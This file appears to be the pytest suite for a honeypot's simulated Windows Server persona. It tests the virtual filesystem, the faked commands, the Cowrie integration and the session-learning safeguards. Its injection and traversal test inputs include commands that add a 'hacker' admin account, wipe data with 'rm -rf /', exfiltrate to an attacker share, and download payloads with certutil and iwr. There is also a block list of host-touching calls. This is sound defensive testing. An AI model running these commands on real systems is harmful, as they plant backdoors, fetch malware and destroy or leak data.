"""Rank 7: the simulated Windows persona (honeypot/windows_persona, docs/PERSONAS.md).

Persona configuration, the isolated virtual filesystem, every implemented command, command-injection and host
isolation, the Cowrie adapter and hook (with a fake protocol; the real Cowrie protocol is exercised by
cowrie_windows_integration.py under Cowrie's own interpreter), and SentinelAI integration: parser intent, V1/V2
exclusion, scored-but-never-learned sessions, the Rank 6 guard. Production artifacts are hashed before and after.
"""
import ast
import base64
import builtins
import json
import os
import socket
import subprocess
import sys
from pathlib import Path
from unittest.mock import MagicMock

import pytest

ENGINE = Path(__file__).resolve().parents[1]
REPO = ENGINE.parent
sys.path.insert(0, str(ENGINE))
sys.path.insert(0, str(REPO / "honeypot"))
sys.path.insert(0, str(REPO / "honeypot" / "parsers"))

from evaluation import rank6_v2_shadow_eval as R6  # noqa: E402
from rl_engine import deception_scorer as ds  # noqa: E402
from rl_engine import persona_policy_v2 as v2mod  # noqa: E402
from rl_engine import v2_activation as guard  # noqa: E402
import switch_profile  # noqa: E402
from windows_persona import (CMD_PROMPT, IDENTITY, STATUS, VfsError, VirtualFS, WindowsShell, attack_techniques,  # noqa: E402
                             classify_windows_intent, metadata, supported_commands)
from windows_persona import cowrie_hook  # noqa: E402
from windows_persona.cowrie_shell import WindowsCowrieShell  # noqa: E402

PKG = REPO / "honeypot" / "windows_persona"
CORPUS = json.loads((Path(__file__).parent / "fixtures" / "windows_intent_corpus.json").read_text(encoding="utf-8"))
SEED = json.loads((ENGINE / "models" / "q_table.json").read_text())
ARTIFACTS = R6.production_artifacts()
BEFORE = R6.hash_artifacts(ARTIFACTS)
SERVABLE_BEFORE = ["ubuntu_22", "debian_11", "centos_7", "aws_ec2", "raspberry_pi"]


@pytest.fixture(autouse=True, scope="module")
def production_artifacts_unchanged():
    yield
    assert R6.hash_artifacts(ARTIFACTS) == BEFORE


@pytest.fixture
def sh():
    return WindowsShell()


def run(sh, line):
    return sh.execute(line)


# ── persona configuration ────────────────────────────────────────────────────────────────────────────────────────
def test_persona_metadata_and_status():
    m = metadata()
    assert m["id"] == "windows_srv"
    assert (m["supported"], m["experimental"], m["productionEligible"], m["servingEnabled"]) == (True, True, False, False)
    assert "not a Windows host" in m["simulation"]
    assert {"RDP", "SMB", "WinRM", "PowerShell runtime"} <= set(m["notSimulated"])
    assert CMD_PROMPT == "C:\\Users\\Administrator>"


def test_identity_matches_the_existing_registry_entries():
    eng, sw = ds.PROFILES["windows_srv"], switch_profile.PROFILES["windows_srv"]
    assert IDENTITY["hostname"] == sw["hostname"] == "WIN-SRV19-DC01"
    assert eng["os"] == sw["os"] == "Windows Server 2019" and IDENTITY["os_name"].startswith("Microsoft Windows Server 2019")
    assert IDENTITY["os_version"] == sw["kernel_version"] == "10.0.17763"
    assert IDENTITY["banner"] == eng["banner"] == sw["banner"]
    assert eng["prompt"] == CMD_PROMPT


def test_hostname_and_os_identity_are_returned(sh):
    assert run(sh, "hostname").output == "WIN-SRV19-DC01"
    assert "Microsoft Windows [Version 10.0.17763" in run(sh, "ver").output
    info = run(sh, "systeminfo").output
    assert "Host Name:                 WIN-SRV19-DC01" in info and "OS Version:                10.0.17763 N/A Build 17763" in info
    assert "CsName                                                  : WIN-SRV19-DC01" in run(sh, "powershell -c Get-ComputerInfo").output


def test_fictional_network_only(sh):
    out = run(sh, "ipconfig /all").output + run(sh, "systeminfo").output + run(sh, "set").output
    assert "10.20.30.15" in out and "00-15-5D-4A-21-07" in out
    # nothing of the real machine leaks into the simulation
    assert socket.gethostname().lower() not in out.lower()
    assert os.environ.get("USERNAME", "zz-none").lower() + "\\" not in out.lower()
    assert str(Path.home()).lower() not in out.lower()


def test_the_five_servable_personas_are_unchanged_and_windows_stays_out():
    assert ds.servable_profiles() == SERVABLE_BEFORE == ds.SUPPORTED_PROFILES
    assert "windows_srv" in ds.UNSUPPORTED_PROFILES and "windows_srv" in switch_profile.UNSERVABLE
    assert ds.PROFILES_LIST == ["ubuntu_22", "debian_11", "centos_7", "windows_srv", "aws_ec2", "raspberry_pi"]


# ── virtual filesystem ───────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("path,cwd,expected", [
    ("C:\\Windows\\System32", "C:\\", "C:\\Windows\\System32"),
    ("c:\\windows\\system32", "C:\\", "C:\\Windows\\System32"),             # case-insensitive, canonical case shown
    ("/users/ADMINISTRATOR/desktop", "C:\\", "C:\\Users\\Administrator\\Desktop"),
    ("Desktop", "C:\\Users\\Administrator", "C:\\Users\\Administrator\\Desktop"),
    ("..", "C:\\Users\\Administrator", "C:\\Users"),
    ("..\\..\\..\\..\\..", "C:\\Users\\Administrator", "C:\\"),              # .. stops at the root, never above it
    ("\\Windows", "C:\\Users", "C:\\Windows"),
    ("C:", "C:\\Temp", "C:\\Temp"),
    ("Program Files\\.\\OpenSSH\\", "C:\\", "C:\\Program Files\\OpenSSH"),
])
def test_drive_paths_navigation_and_normalisation(path, cwd, expected):
    assert VirtualFS().chdir(path, cwd) == expected


def test_listing_and_reading():
    v = VirtualFS()
    path, node, items = v.listdir("C:\\", "C:\\")
    names = [i.name for i in items]
    assert path == "C:\\" and {"Windows", "Users", "Program Files", "Temp", "inetpub", "PerfLogs"} <= set(names)
    assert "$Recycle.Bin" not in names and "ProgramData" not in names            # hidden, as on Windows
    hidden = [i.name for i in v.listdir("C:\\", "C:\\", show_hidden=True)[2]]
    assert "$Recycle.Bin" in hidden and "ProgramData" in hidden
    assert "dc01.corp.local" in v.read("C:\\WINDOWS\\system32\\DRIVERS\\etc\\HOSTS", "C:\\")
    assert v.read("notes.txt", "C:\\Users\\Administrator\\Desktop").startswith("TODO")


@pytest.mark.parametrize("bad,err", [
    ("D:\\data", "cannot find the drive"),
    ("\\\\fileserver\\share\\x", "network path"),
    ("C:\\Windows\\win.ini:stream", "syntax is incorrect"),
    ("C:\\Temp\\a<b", "syntax is incorrect"),
    ("C:\\Temp\\a\x00b", "syntax is incorrect"),
    ("C:\\Temp\\CON", "cannot find the path"),
    ("C:\\" + "a" * 300, "too long"),
    ("C:\\nope\\nothing.txt", "cannot find the file"),
])
def test_invalid_paths_are_rejected(bad, err):
    with pytest.raises(VfsError) as e:
        VirtualFS().read(bad, "C:\\")
    assert err in str(e.value)


def test_path_traversal_cannot_leave_the_virtual_root(tmp_path):
    secret = tmp_path / "host_secret.txt"
    secret.write_text("HOST-SECRET-123")
    v = VirtualFS()
    attempts = [str(secret), str(secret).replace("\\", "/"), "..\\" * 20 + "Windows\\win.ini", "../../../../etc/passwd",
                "C:\\..\\..\\..\\" + str(secret)[3:], "/etc/shadow", "\\\\?\\" + str(secret), "file:///" + str(secret)]
    for a in attempts:
        try:
            content = v.read(a, "C:\\Users\\Administrator")
        except VfsError:
            continue
        assert "HOST-SECRET" not in content
        # the only readable results are files of the virtual tree
        assert content == v.read("C:\\Windows\\win.ini", "C:\\")
    assert secret.read_text() == "HOST-SECRET-123"


def test_writes_stay_inside_the_virtual_filesystem_and_allowed_areas(sh, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    before = sorted(p.name for p in tmp_path.iterdir())
    assert run(sh, "echo canary > C:\\Temp\\drop.txt").exit_code == 0
    assert run(sh, "type C:\\Temp\\drop.txt").output == "canary"
    assert run(sh, "echo more >> C:\\temp\\DROP.TXT") and run(sh, "type C:\\Temp\\drop.txt").output == "canary\nmore"
    assert "Access is denied." in run(sh, "echo x > C:\\Windows\\System32\\evil.dll").output
    assert "Access is denied." in run(sh, "del C:\\Windows\\win.ini").output
    assert "Access is denied." in run(sh, "mkdir C:\\Windows\\x").output
    assert run(sh, "mkdir C:\\Users\\Administrator\\loot\\deep").exit_code == 0
    assert sorted(p.name for p in tmp_path.iterdir()) == before          # nothing appeared on the host
    assert "drop.txt" not in [i.name for i in VirtualFS().listdir("C:\\Temp", "C:\\")[2]]  # sessions are isolated


def test_write_quotas(sh):
    big = "A" * 70000
    outs = [run(sh, f"echo {'B' * 8000} >> C:\\Temp\\a.txt").output for _ in range(9)]
    assert outs[:8] == [""] * 8 and outs[8] == "There is not enough space on the disk."
    v = VirtualFS()
    with pytest.raises(VfsError):
        v.write("C:\\Temp\\b.txt", "C:\\", big)
    for i in range(256):
        v.mkdir(f"C:\\Temp\\d{i}", "C:\\")
    with pytest.raises(VfsError, match="not enough space"):
        v.mkdir("C:\\Temp\\one-too-many", "C:\\")


# ── command simulation ───────────────────────────────────────────────────────────────────────────────────────────
COMMANDS = [
    ("dir", "Directory of C:\\Users\\Administrator"), ("dir /a", "NTUSER.DAT"), ("dir /b C:\\", "Windows"),
    ("dir C:\\Windows\\*.ini", "win.ini"), ("cd", "C:\\Users\\Administrator"), ("chdir", "C:\\Users\\Administrator"),
    ("type C:\\Windows\\win.ini", "[fonts]"), ("more C:\\Windows\\win.ini", "[fonts]"),
    ("whoami", "win-srv19-dc01\\administrator"), ("whoami /all", "BUILTIN\\Administrators"),
    ("whoami /priv", "SeChangeNotifyPrivilege"), ("hostname", "WIN-SRV19-DC01"), ("ver", "10.0.17763"),
    ("systeminfo", "Hotfix(s):"), ("ipconfig", "IPv4 Address"), ("ipconfig /all", "Physical Address"),
    ("ping -n 1 dc01", "Reply from 10.20.30.10"), ("ping 127.0.0.1", "Reply from 127.0.0.1"),
    ("netstat -ano", "0.0.0.0:3389"), ("netstat", "ESTABLISHED"), ("tasklist", "lsass.exe"), ("tasklist /svc", "TermService"),
    ("sc query", "SERVICE_NAME: sshd"), ("sc query wuauserv", "STOPPED"), ("net user", "svc_backup"),
    ("net user Administrator", "Account active               Yes"), ("net localgroup administrators", "svc_backup"),
    ("net share", "ADMIN$"), ("net accounts", "Maximum password age"), ("set COMPUTERNAME", "COMPUTERNAME=WIN-SRV19-DC01"),
    ("echo hello world", "hello world"), ("echo %USERNAME%", "Administrator"), ("date /t", "/"), ("help", "DIR"),
    ("findstr corp C:\\Windows\\System32\\drivers\\etc\\hosts", "sql01.corp.local"),
    ("powershell -c Get-Process", "lsass"), ("powershell -c Get-Service", "WinDefend"),
    ("powershell -c Get-Location", "C:\\Users\\Administrator"), ("powershell -c Get-ChildItem C:\\Temp", "setup.log"),
    ("powershell -c Get-Content C:\\Temp\\setup.log", "Installing IIS"), ("powershell -c Get-LocalUser", "svc_backup"),
    ("powershell -c Get-ComputerInfo", "WindowsProductName"), ("powershell -c $PSVersionTable", "5.1.17763"),
    ("cmd /c whoami", "win-srv19-dc01\\administrator"),
]


@pytest.mark.parametrize("line,expected", COMMANDS)
def test_every_implemented_command_returns_its_output(sh, line, expected):
    r = run(sh, line)
    assert expected in r.output, (line, r.output[:300])
    assert all(e["recognised"] for e in r.events) and all(e["simulated"] for e in r.events)


def test_command_list_is_explicit():
    s = supported_commands()
    assert {"dir", "cd", "type", "cls", "ver"} <= set(s["cmd"])
    assert {"whoami", "hostname", "systeminfo", "ipconfig", "ping", "netstat", "tasklist", "sc", "net"} <= set(s["native"])
    assert {"get-computerinfo", "get-process", "get-service", "get-location", "get-childitem", "get-content"} <= set(s["powershell"])


def test_cls_and_exit(sh):
    assert run(sh, "cls").clear is True
    assert run(sh, "exit").exit_session is True


def test_unknown_commands_give_windows_errors(sh):
    r = run(sh, "frobnicate --now")
    assert r.output == "'frobnicate' is not recognized as an internal or external command,\noperable program or batch file."
    assert r.exit_code == 9009 and r.failed and r.events[0]["category"] == "unrecognised"
    run(sh, "powershell")
    r = run(sh, "Invoke-Frobnicate")
    assert "The term 'Invoke-Frobnicate' is not recognized as the name of a cmdlet" in r.output and r.failed
    assert "is not recognized" in run(sh, "uname -a").output


def test_not_generic_output(sh):
    outs = {line: run(sh, line).output for line, _ in COMMANDS[:20]}
    assert len(set(outs.values())) >= 18


def test_arguments_quotes_and_spaces(sh):
    assert run(sh, 'cd "C:\\Program Files"').exit_code == 0 and sh.cwd == "C:\\Program Files"
    assert run(sh, "cd C:\\Program Files (x86)").exit_code == 0 and sh.cwd == "C:\\Program Files (x86)"
    assert run(sh, "cd..").exit_code == 0 and sh.cwd == "C:\\"
    assert run(sh, "   whoami    ").output == "win-srv19-dc01\\administrator"
    assert run(sh, 'echo "a & b"').output == '"a & b"'


def test_invalid_syntax_is_handled(sh):
    assert run(sh, "whoami |").output == "The syntax of the command is incorrect."
    assert run(sh, "echo x >").output == "The syntax of the command is incorrect."
    assert run(sh, "type nofile < missing.txt").exit_code == 1
    assert run(sh, "x" * 9000).output == "The command line is too long."
    assert run(sh, "").output == "" and run(sh, None).output == ""
    run(sh, "powershell")
    assert "is not a valid statement separator" in run(sh, "whoami && hostname").output


def test_prompts_are_consistent(sh):
    assert sh.prompt() == "C:\\Users\\Administrator>"
    run(sh, "cd \\Windows")
    assert sh.prompt() == "C:\\Windows>"
    run(sh, "powershell")
    assert sh.prompt() == "PS C:\\Windows> "
    run(sh, "exit")
    assert sh.prompt() == "C:\\Windows>"


def test_chaining_semantics(sh):
    r = run(sh, "frob && whoami || hostname & ver")
    assert [e["name"] for e in r.events] == ["frob", "hostname", "ver"]
    r = run(sh, "type C:\\Windows\\System32\\drivers\\etc\\hosts | findstr sql01")
    assert r.output == "10.20.30.22     sql01.corp.local"


def test_powershell_encoded_command_is_decoded_and_simulated(sh):
    enc = base64.b64encode("Get-Location".encode("utf-16-le")).decode()
    r = run(sh, f"powershell -enc {enc}")
    assert "C:\\Users\\Administrator" in r.output and any(e["name"] == "get-location" for e in r.events)
    assert "not properly encoded" in run(sh, "powershell -enc !!!").output


# ── security ─────────────────────────────────────────────────────────────────────────────────────────────────────
FORBIDDEN_IMPORTS = {"os", "subprocess", "socket", "pathlib", "shutil", "ctypes", "importlib", "pty", "multiprocessing",
                     "asyncio", "urllib", "http", "requests", "ftplib", "telnetlib", "io", "tempfile", "glob", "fnmatch"}
FORBIDDEN_CALLS = {"eval", "exec", "open", "compile", "__import__", "input", "breakpoint"}


@pytest.mark.parametrize("module", sorted(p.name for p in PKG.glob("*.py")))
def test_package_cannot_touch_the_host(module):
    tree = ast.parse((PKG / module).read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            assert not {a.name.split(".")[0] for a in node.names} & FORBIDDEN_IMPORTS, (module, ast.dump(node))
        if isinstance(node, ast.ImportFrom) and node.level == 0:
            assert node.module.split(".")[0] not in FORBIDDEN_IMPORTS, (module, node.module)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            assert node.func.id not in FORBIDDEN_CALLS, (module, node.func.id)
            if node.func.id in ("getattr", "setattr", "delattr"):  # only literal attribute names, never attacker text
                assert len(node.args) >= 2 and isinstance(node.args[1], ast.Constant), (module, ast.dump(node))
        if isinstance(node, ast.Attribute):
            assert node.attr not in {"system", "popen", "Popen", "spawn", "startfile", "connect", "urlopen"}, (module, node.attr)


INJECTIONS = [
    "whoami & calc.exe", "whoami && net user hacker P@ss /add", "whoami || shutdown /s", "dir | powershell -c iex(x)",
    "whoami; rm -rf /", "echo $(id)", "echo `id`", "echo %COMSPEC% & %COMSPEC% /c whoami", "type ..\\..\\..\\..\\Windows\\win.ini",
    "dir > \\\\attacker\\share\\loot.txt", "type C:\\Windows\\win.ini > CON", "echo x >> ../../../../tmp/pwn", "cmd /c \"cmd /c \"cmd /c \"cmd /c whoami\"\"\"\"",
    "powershell -c \"Start-Process cmd; Invoke-Expression 'calc'\"", "powershell -c [System.Diagnostics.Process]::Start('calc')",
    "ping -n 3 198.51.100.1 & ping attacker.example", "certutil -urlcache -f http://198.51.100.7/x x", "C:\\Windows\\System32\\cmd.exe /c whoami",
    "\x1b[2J\x00whoami", "whoami\r\nnet user", "^& whoami ^| calc", "%SystemRoot%\\System32\\whoami.exe",
    "powershell iwr http://198.51.100.7 -OutFile C:\\Windows\\a.exe", "set PATH=C:\\attacker & whoami",
]


def test_injection_never_reaches_the_host(sh, monkeypatch, tmp_path):
    calls = []

    def forbid(name):
        def f(*a, **k):
            calls.append(name)
            raise AssertionError(name)
        return f
    for mod, name in [(subprocess, "Popen"), (subprocess, "run"), (subprocess, "call"), (os, "system"), (os, "popen"),
                      (os, "startfile"), (os, "execv"), (os, "spawnv"), (socket, "socket"), (socket, "create_connection"),
                      (socket, "getaddrinfo"), (builtins, "open"), (builtins, "eval"), (builtins, "exec")]:
        if hasattr(mod, name):
            monkeypatch.setattr(mod, name, forbid(f"{getattr(mod, '__name__', mod)}.{name}"))
    for line in INJECTIONS:
        r = sh.execute(line)
        assert isinstance(r.output, str) and len(r.output) <= 64 * 1024
    monkeypatch.undo()
    assert calls == []
    assert "calc" not in run(WindowsShell(), "tasklist").output


def test_injected_text_is_inert(sh):
    assert run(sh, "echo $(id)").output == "$(id)"
    assert run(sh, "echo `id`").output == "`id`"
    r = run(sh, "whoami; rm -rf /")  # ';' is not a cmd separator: one unknown program name, nothing runs
    assert r.output.startswith("'whoami;' is not recognized") and r.events[0]["recognised"] is False
    assert len(r.events) == 1 and r.exit_code == 9009


def test_network_commands_are_simulated(sh, monkeypatch):
    monkeypatch.setattr(socket, "socket", MagicMock(side_effect=AssertionError("socket")))
    monkeypatch.setattr(socket, "getaddrinfo", MagicMock(side_effect=AssertionError("dns")))
    assert "Request timed out." in run(sh, "ping 198.51.100.1").output
    assert "could not find host" in run(sh, "ping attacker.example").output
    assert "ERROR_INTERNET_NAME_NOT_RESOLVED" in run(sh, "certutil -urlcache -f http://198.51.100.7/a a").output
    run(sh, "powershell")
    assert "Unable to connect to the remote server" in run(sh, "iwr http://198.51.100.7/a").output


def test_recursion_and_output_are_bounded(sh):
    nested = "cmd /c " * 50 + "whoami"
    r = run(sh, nested)
    assert len(r.output) <= 64 * 1024
    many = " & ".join(["whoami"] * 100)
    assert len(run(sh, many).events) <= 32


# ── Cowrie adapter and hook (fake protocol) ──────────────────────────────────────────────────────────────────────
class FakeTerminal:
    def __init__(self):
        self.out = b""
        self.cleared = 0

    def write(self, b):
        self.out += b

    def eraseDisplay(self):
        self.cleared += 1

    def cursorHome(self):
        pass


class FakeProtocol:
    def __init__(self):
        self.terminal = FakeTerminal()
        self.events = MagicMock()
        self.ended = None
        self.lineBuffer, self.lineBufferIndex, self.ps = [b"x"], 1, None

    def end_process(self, code):
        self.ended = code


def test_adapter_drives_the_simulator_and_logs_cowrie_events():
    p = FakeProtocol()
    s = WindowsCowrieShell(p)
    s.showPrompt()
    assert p.terminal.out == b"C:\\Users\\Administrator>" and p.ps[0] == b"C:\\Users\\Administrator>"
    p.terminal.out = b""
    s.lineReceived(b"whoami\r\n")
    assert p.terminal.out == b"win-srv19-dc01\\administrator\r\nC:\\Users\\Administrator>"
    s.lineReceived("frob x")
    ids = [c.args[0] for c in p.events.dispatch.call_args_list]
    assert ids.count("cowrie.command.input") == 2 and ids.count("cowrie.command.failed") == 1
    assert p.events.dispatch.call_args_list[0].kwargs == {"input": "whoami"}
    sim = [c.kwargs for c in p.events.dispatch.call_args_list if c.args[0] == "sentinel.windows.command"]
    assert sim[0]["intent"] == "RECONNAISSANCE" and sim[0]["attack"] == ["T1033"] and sim[0]["simulated"] is True
    s.lineReceived("cls")
    assert p.terminal.cleared == 1
    s.handle_CTRL_C()
    assert p.lineBuffer == [] and p.terminal.out.endswith(b"^C\r\nC:\\Users\\Administrator>")
    s.lineReceived("exit")
    assert p.ended == 0


def test_adapter_has_every_attribute_cowrie_uses():
    s = WindowsCowrieShell(FakeProtocol())
    for attr in ("lineReceived", "showPrompt", "resume", "eofReceived", "handle_CTRL_C", "handle_TAB", "interactive",
                 "cwd", "environ", "exported", "last_exit_code", "reads_stdin"):
        assert hasattr(s, attr), attr


def test_non_interactive_exec_runs_one_command_and_ends():
    p = FakeProtocol()
    WindowsCowrieShell(p, interactive=False).lineReceived("hostname")
    assert p.terminal.out == b"WIN-SRV19-DC01\r\n" and p.ended == 0


def test_hook_is_off_by_default_and_needs_every_condition():
    mod = type("M", (), {"HoneyPotShell": object})
    assert cowrie_hook.install(mod) == "DISABLED"
    assert cowrie_hook.install(mod, enabled=True, persona="ubuntu_22", allow_experimental=True) == "PERSONA_NOT_WINDOWS"
    assert cowrie_hook.install(mod, enabled=True, persona="windows_srv") == "EXPERIMENTAL_NOT_ACKNOWLEDGED"
    assert cowrie_hook.install(mod, enabled="yes", persona="windows_srv", allow_experimental=True) == "DISABLED"
    assert mod.HoneyPotShell is object
    assert cowrie_hook.install(mod, enabled=True, persona="windows_srv", allow_experimental=True) == "INSTALLED"
    assert mod.HoneyPotShell is WindowsCowrieShell
    assert cowrie_hook.uninstall(mod) and mod.HoneyPotShell is object


def test_shipped_cowrie_config_does_not_enable_the_plugin():
    cfg = (REPO / "honeypot" / "cowrie" / "cowrie.cfg").read_text(encoding="utf-8")
    assert "output_sentinelwindows" not in cfg


# ── telemetry, parser and ATT&CK ─────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd,intent", CORPUS["windows"])
def test_windows_intent_corpus(cmd, intent):
    assert classify_windows_intent(cmd) == intent


def test_attack_mapping_for_windows_commands():
    ids = lambda c: [t["id"] for t in attack_techniques(c)]  # noqa: E731
    assert ids("systeminfo") == ["T1082"] and ids("whoami") == ["T1033"] and "T1016" in ids("ipconfig /all")
    assert "T1003.002" in ids("type C:\\Windows\\System32\\config\\SAM")
    assert "T1105" in ids("certutil -urlcache -f http://x/a a") and "T1053.005" in ids("schtasks /create /tn a")


def test_parser_classifies_windows_only_for_windows_sessions(monkeypatch):
    # same convention as test_cowrie_parser.py: a dummy key; the parser's state dir is a tmp dir (conftest), its
    # logging goes to the console only, and nothing is posted (only the pure classifier is called).
    monkeypatch.setenv("HONEYPOT_API_KEY", os.environ.get("HONEYPOT_API_KEY") or "mock-honeypot-key-for-parser-tests")
    import log_parser
    for cmd in CORPUS["linux_unchanged"] + [c for c, _ in CORPUS["windows"]]:
        for persona in (None, "ubuntu_22", "centos_7", "aws_ec2"):
            assert log_parser.classify_session_intent(cmd, persona) == log_parser.classify_intent(cmd)
    assert log_parser.classify_session_intent("systeminfo", "windows_srv") == "RECONNAISSANCE"
    assert log_parser.classify_session_intent("certutil -urlcache -f http://x/a a", "windows_srv") == "MALWARE_DOWNLOAD"
    assert log_parser.classify_session_intent("uname -a", "windows_srv") == "RECONNAISSANCE"  # Linux rule still first
    assert "windows_srv" in log_parser.PERSONAS


# ── persona policy and scoring safety ────────────────────────────────────────────────────────────────────────────
def _scorer(tmp_path, with_v2=True):
    table = tmp_path / "q.json"
    table.write_text(json.dumps(SEED))
    sc = ds.SessionScorer(q_table_path=str(table))
    if with_v2:
        sc.v2 = v2mod.PersonaPolicyV2(tmp_path / "v2.json", prior_means=v2mod.prior_from_q_table(SEED["q_table"]))
        sc.v2_mode = "shadow"
    return sc, table


WIN_SESSION = {"sessionId": "win-1", "durationSeconds": 240, "loginSucceeded": True, "iocCount": 1,
               "deceptionProfile": "windows_srv", "previousProfile": "centos_7",
               "commands": [{"command": "systeminfo", "intent": "RECONNAISSANCE"},
                            {"command": "certutil -urlcache -f http://x/a a", "intent": "MALWARE_DOWNLOAD"}]}


def test_a_windows_session_is_scored_but_never_learned(tmp_path):
    sc, table = _scorer(tmp_path)
    before_bytes = table.read_bytes()
    before_q = json.dumps(sc.learner.q_table, sort_keys=True)
    episodes, current = sc.learner.episode_count, sc.current
    out = sc.process_session(dict(WIN_SESSION))
    assert out["learned"] is False and out["notLearnedReason"] == "EXPERIMENTAL_PERSONA" and out["experimentalPersona"] is True
    assert out["deceptionScore"] == round(max(0.0, min(ds.calc_reward(WIN_SESSION) * 5, 100)), 1)
    assert out["nextProfile"] in SERVABLE_BEFORE and "policyV2" not in out
    assert table.read_bytes() == before_bytes and json.dumps(sc.learner.q_table, sort_keys=True) == before_q
    assert sc.learner.episode_count == episodes and sc.current == current
    assert not (tmp_path / "v2.json").exists() or "win-1" not in (tmp_path / "v2.json").read_text()


def test_linux_sessions_are_scored_and_learned_exactly_as_before(tmp_path):
    sc, table = _scorer(tmp_path, with_v2=False)
    s = dict(WIN_SESSION, deceptionProfile="debian_11", sessionId="lin-1")
    out = sc.process_session(s)
    assert out["learned"] is True and "experimentalPersona" not in out
    assert out["deceptionScore"] == round(max(0.0, min(ds.calc_reward(s) * 5, 100)), 1)


def test_v1_never_selects_windows(tmp_path):
    sc, _ = _scorer(tmp_path, with_v2=False)
    for state in ds.PROFILES_LIST:
        for _ in range(200):
            assert sc.learner.choose_action(state) != "windows_srv"
        assert sc.learner.greedy_action(state) != "windows_srv"


def test_v2_cannot_serve_windows_and_the_rank6_guard_is_still_fail_closed():
    assert v2mod.validate_recommendation("windows_srv") == (None, "INVALID_RECOMMENDATION")
    assert "windows_srv" not in v2mod.servable_profiles() if hasattr(v2mod, "servable_profiles") else True
    d = guard.activation_decision("active")
    assert d["allowed"] is False and d["readiness"] == "NOT_READY"
    assert os.environ.get("DECEPTION_V2") in (None, "", "shadow")


def test_switch_profile_still_refuses_windows(capsys):
    with pytest.raises(SystemExit) as e:
        switch_profile.generate_config("windows_srv")
    assert e.value.code == 2


# ── Rank 8 (F1): an experimental persona can never become a Q-learning state ─────────────────────────────────────
def _snapshot(sc, table):
    return (table.read_bytes(), json.dumps(sc.learner.q_table, sort_keys=True), sc.learner.episode_count,
            json.dumps(getattr(sc.learner, "arm_evidence", {}), sort_keys=True))


def _linux(sid, prev, active="ubuntu_22"):
    return {"sessionId": sid, "durationSeconds": 120, "loginSucceeded": True, "iocCount": 0,
            "commands": [{"command": "uname -a", "intent": "RECONNAISSANCE"}],
            "deceptionProfile": active, "previousProfile": prev}


def test_f1_windows_session_followed_by_linux_session_learns_nothing_from_the_windows_state(tmp_path):
    sc, table = _scorer(tmp_path)
    before = _snapshot(sc, table)
    win = sc.process_session(dict(WIN_SESSION))
    lin = sc.process_session(_linux("lin-after-win", "windows_srv"))
    assert win["learned"] is False and win["notLearnedReason"] == "EXPERIMENTAL_PERSONA"
    assert lin["learned"] is False and lin["notLearnedReason"] == "UNSUPPORTED_PREVIOUS_PERSONA"
    assert lin["experimentalPreviousPersona"] is True and lin["nextProfile"] in SERVABLE_BEFORE
    assert "policyV2" not in lin                                         # v2 does not observe it either
    assert _snapshot(sc, table) == before                               # file, Q-values, episodes, evidence


@pytest.mark.parametrize("prev", ["windows_srv"])
def test_f1_unsupported_previous_persona_is_rejected_without_any_q_table_change(tmp_path, prev):
    sc, table = _scorer(tmp_path, with_v2=False)
    before = _snapshot(sc, table)
    out = sc.process_session(_linux("lin-x", prev, active="debian_11"))
    assert out["learned"] is False and out["prevProfile"] == prev
    assert _snapshot(sc, table) == before


def test_f1_windows_current_persona_is_still_rejected(tmp_path):
    sc, table = _scorer(tmp_path)
    before = _snapshot(sc, table)
    out = sc.process_session(dict(WIN_SESSION, previousProfile="ubuntu_22"))
    assert out["notLearnedReason"] == "EXPERIMENTAL_PERSONA" and out["experimentalPreviousPersona"] is False
    assert _snapshot(sc, table) == before


@pytest.mark.parametrize("prev", [None, "", "not_a_persona"])
def test_f1_missing_or_unknown_previous_persona_keeps_the_existing_fallback(tmp_path, prev):
    sc, table = _scorer(tmp_path, with_v2=False)
    out = sc.process_session(_linux("lin-m", prev, active="centos_7"))
    # unchanged behaviour: the learner falls back to its last servable state (here the active persona) and learns
    assert out["learned"] is True and out["prevProfile"] in SERVABLE_BEFORE


def test_f1_valid_linux_to_linux_learning_is_unchanged(tmp_path):
    sc, table = _scorer(tmp_path, with_v2=False)
    q_before = sc.learner.q_table["centos_7"]["ubuntu_22"]
    out = sc.process_session(_linux("lin-ok", "centos_7"))
    assert out["learned"] is True and out["prevProfile"] == "centos_7" and "notLearnedReason" not in out
    assert sc.learner.q_table["centos_7"]["ubuntu_22"] != q_before


@pytest.mark.parametrize("args", [("windows_srv", "ubuntu_22", "ubuntu_22"), ("ubuntu_22", "windows_srv", "windows_srv"),
                                  ("ubuntu_22", "ubuntu_22", "windows_srv"), ("bogus", "ubuntu_22", "ubuntu_22")])
def test_f1_the_learner_itself_refuses_ineligible_personas(tmp_path, args):
    """Defence in depth: DeceptionQLearner.update refuses before any side effect, whoever calls it."""
    table = tmp_path / "q.json"
    table.write_text(json.dumps(SEED))
    L = ds.DeceptionQLearner(q_table_path=str(table))
    before = (table.read_bytes(), json.dumps(L.q_table, sort_keys=True), L.episode_count)
    state, action, next_state = args
    assert L.update(state, action, 5.0, next_state, session_id="s-f1", source="operator") is False
    assert (table.read_bytes(), json.dumps(L.q_table, sort_keys=True), L.episode_count) == before
    assert not L.already_learned("s-f1")
